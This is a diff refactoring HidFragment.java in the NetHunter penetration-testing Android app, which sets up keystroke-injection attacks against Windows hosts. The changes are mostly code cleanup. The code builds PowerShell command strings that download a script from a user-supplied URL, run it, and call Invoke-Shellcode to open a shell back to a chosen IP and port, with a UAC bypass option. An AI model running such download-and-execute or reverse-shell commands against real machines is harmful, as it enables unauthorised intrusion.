@@ -21,24 +21,26 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Spinner;
 
+import com.google.android.material.dialog.MaterialAlertDialogBuilder;
 import com.offsec.nethunter.utils.NhPaths;
 import com.offsec.nethunter.utils.ShellExecuter;
 
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.OutputStreamWriter;
+import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
-import androidx.appcompat.app.AlertDialog;
 import androidx.fragment.app.Fragment;
 import androidx.fragment.app.FragmentManager;
 import androidx.fragment.app.FragmentPagerAdapter;
 import androidx.viewpager.widget.ViewPager;
 
-public class HidFragment extends Fragment {
 
+public class HidFragment extends Fragment {
     private ViewPager mViewPager;
     private SharedPreferences sharedpreferences;
     private final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
@@ -47,7 +49,7 @@ public class HidFragment extends Fragment {
     private Context context;
     private Activity activity;
     private static final String ARG_SECTION_NUMBER = "section_number";
-    private ShellExecuter exe = new ShellExecuter();
+    private final ShellExecuter exe = new ShellExecuter();
 
     public static HidFragment newInstance(int sectionNumber) {
         HidFragment fragment = new HidFragment();
@@ -86,23 +88,21 @@ public class HidFragment extends Fragment {
         sharedpreferences = activity.getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
         check_HID_enable();
         return rootView;
-
     }
 
-
     @Override
-    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
+    public void onCreateOptionsMenu(@NonNull Menu menu, MenuInflater inflater) {
         inflater.inflate(R.menu.hid, menu);
     }
 
-
+    @Override
     public void onPrepareOptionsMenu(Menu menu) {
         int pageNum = mViewPager.getCurrentItem();
         final MenuItem sourceButton = menu.findItem(R.id.source_button);
         //WearOS optimisation
-        boolean iswatch = getActivity().getPackageManager().hasSystemFeature(PackageManager.FEATURE_WATCH);
+        boolean iswatch = requireActivity().getPackageManager().hasSystemFeature(PackageManager.FEATURE_WATCH);
         if (pageNum == 0) {
-            if(iswatch) sourceButton.setVisible(false); else sourceButton.setVisible(true);
+            sourceButton.setVisible(!iswatch);
         } else {
             sourceButton.setVisible(false);
         }
@@ -255,7 +255,7 @@ public class HidFragment extends Fragment {
     private void openDialog() {
 
         int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
-        AlertDialog.Builder builder = new AlertDialog.Builder(activity);
+        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
         builder.setTitle("UAC Bypass:");
         builder.setPositiveButton("OK", (dialog, which) -> {
         });
@@ -269,10 +269,9 @@ public class HidFragment extends Fragment {
     }
 
     private void openLanguageDialog() {
-
         int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
 
-        AlertDialog.Builder builder = new AlertDialog.Builder(activity);
+        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
         builder.setTitle("Keyboard Layout:");
         builder.setPositiveButton("OK", (dialog, which) -> {
 
@@ -287,11 +286,11 @@ public class HidFragment extends Fragment {
     }
 
     public static class TabsPagerAdapter extends FragmentPagerAdapter {
-
         TabsPagerAdapter(FragmentManager fm) {
             super(fm);
         }
 
+        @NonNull
         @Override
         public Fragment getItem(int i) {
             switch (i) {
@@ -351,30 +350,27 @@ public class HidFragment extends Fragment {
         }
 
         public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powersploitOptionsUpdate:
-                    if (getView() == null) {
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    EditText ip = getView().findViewById(R.id.ipaddress);
-                    EditText port = getView().findViewById(R.id.port);
+            if (v.getId() == R.id.powersploitOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                EditText ip = getView().findViewById(R.id.ipaddress);
+                EditText port = getView().findViewById(R.id.port);
 
-                    Spinner payload = getView().findViewById(R.id.payload);
-                    String payloadValue = payload.getSelectedItem().toString();
+                Spinner payload = getView().findViewById(R.id.payload);
+                String payloadValue = payload.getSelectedItem().toString();
 
-                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
+                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved) {
-                        NhPaths.showMessage(context,"Source not updated (configFileUrlPath)");
-                    }
-                    break;
-                default:
-                    NhPaths.showMessage(context,"Unknown click");
-                    break;
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
+                }
+            } else {
+                NhPaths.showMessage(context, "Unknown click");
             }
         }
 
@@ -471,7 +467,6 @@ public class HidFragment extends Fragment {
         private static final int PICKFILE_RESULT_CODE = 1;
 
         public void onClick(View v) {
-
             switch (v.getId()) {
                 case R.id.windowsCmdUpdate:
                     if (getView() == null) {
@@ -479,7 +474,7 @@ public class HidFragment extends Fragment {
                     }
                     EditText source = getView().findViewById(R.id.windowsCmdSource);
                     String text = source.getText().toString();
-                    Boolean isSaved = exe.SaveFileContents(text, configFilePath);
+                    boolean isSaved = exe.SaveFileContents(text, configFilePath);
                     if (isSaved) {
                         NhPaths.showMessage(context, "Source updated");
                     }
@@ -504,7 +499,7 @@ public class HidFragment extends Fragment {
                     } catch (Exception e) {
                         NhPaths.showMessage(context, e.getMessage());
                     }
-                    AlertDialog.Builder alert = new AlertDialog.Builder(activity);
+                    MaterialAlertDialogBuilder alert = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
 
                     alert.setTitle("Name");
                     alert.setMessage("Please enter a name for your script.");
@@ -515,7 +510,7 @@ public class HidFragment extends Fragment {
 
                     alert.setPositiveButton("Ok", (dialog, whichButton) -> {
                         String value = input.getText().toString();
-                        if (!value.equals("") && value.length() > 0) {
+                        if (!value.isEmpty() && value.length() > 0) {
                             //FIXME Save file (ask name)
                             File scriptFile = new File(loadFilePath + File.separator + value + ".conf");
                             if (!scriptFile.exists()) {
@@ -555,15 +550,12 @@ public class HidFragment extends Fragment {
 
         @Override
         public void onActivityResult(int requestCode, int resultCode, Intent data) {
-            switch (requestCode) {
-                case PICKFILE_RESULT_CODE:
-                    if (resultCode == Activity.RESULT_OK && getView() != null) {
-                        String FilePath = data.getData().getPath();
-                        EditText source = getView().findViewById(R.id.windowsCmdSource);
-                        exe.ReadFile_ASYNC(FilePath, source);
-                        NhPaths.showMessage(context,"Script loaded");
-                    }
-                    break;
+            if (requestCode == PICKFILE_RESULT_CODE && (resultCode == Activity.RESULT_OK && getView() != null)) {
+                    String FilePath = Objects.requireNonNull(data.getData()).getPath();
+                    EditText source = getView().findViewById(R.id.windowsCmdSource);
+                    exe.ReadFile_ASYNC(FilePath, source);
+                    NhPaths.showMessage(context, "Script loaded");
+
             }
         }
     }
@@ -592,23 +584,20 @@ public class HidFragment extends Fragment {
         }
 
         public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powershellOptionsUpdate:
-                    if (getView() == null) {
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
+            if (v.getId() == R.id.powershellOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
 
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved) {
-                        NhPaths.showMessage(context,"Source not updated (configFileUrlPath)");
-                    }
-                    break;
-                default:
-                    NhPaths.showMessage(context,"Unknown click");
-                    break;
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
+                }
+            } else {
+                NhPaths.showMessage(context, "Unknown click");
             }
         }
 
@@ -627,31 +616,26 @@ public class HidFragment extends Fragment {
                 final String line = lines[lines.length - 1];
 
                 payloadUrl.post(() -> {
-
                     if (matcherPayloadUrl.find()) {
                         String payloadUrlValue = matcherPayloadUrl.group(1);
                         payloadUrl.setText(payloadUrlValue);
                     }
-
                 });
             }).start();
         }
     }
 
     private void check_HID_enable() {
-        new Thread(new Runnable() {
-            public void run() {
-                ShellExecuter exe_check = new ShellExecuter();
-                String hidgs[] = {"/dev/hidg0", "/dev/hidg1"};
-                for (String hidg : hidgs) {
-                    if (!exe_check.RunAsRootOutput("su -c \"stat -c '%a' " + hidg + "\"").equals("666")) {
-                        isHIDenable = false;
-                        break;
-                    }
-                    isHIDenable = true;
+        new Thread(() -> {
+            ShellExecuter exe_check = new ShellExecuter();
+            String[] hidgs = {"/dev/hidg0", "/dev/hidg1"};
+            for (String hidg : hidgs) {
+                if (!exe_check.RunAsRootOutput("su -c \"stat -c '%a' " + hidg + "\"").equals("666")) {
+                    isHIDenable = false;
+                    break;
                 }
+                isHIDenable = true;
             }
         }).start();
     }
-
 }
